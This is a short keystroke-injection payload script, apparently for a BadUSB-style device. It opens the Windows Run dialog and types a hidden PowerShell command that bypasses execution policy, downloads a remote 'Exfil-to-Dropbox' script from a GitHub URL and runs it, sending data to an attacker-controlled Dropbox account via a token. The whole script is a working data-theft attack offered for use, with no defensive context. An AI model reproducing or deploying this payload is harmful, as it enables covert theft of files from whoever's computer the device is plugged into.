
// Replace DROPBOX_TOKEN before running!

// script setup
layout("us")

// Open Powershell as Admin
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C $db='DROPBOX_TOKEN'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/Exfil-to-Dropbox.ps1 | iex");
delay(500);
press("ENTER");
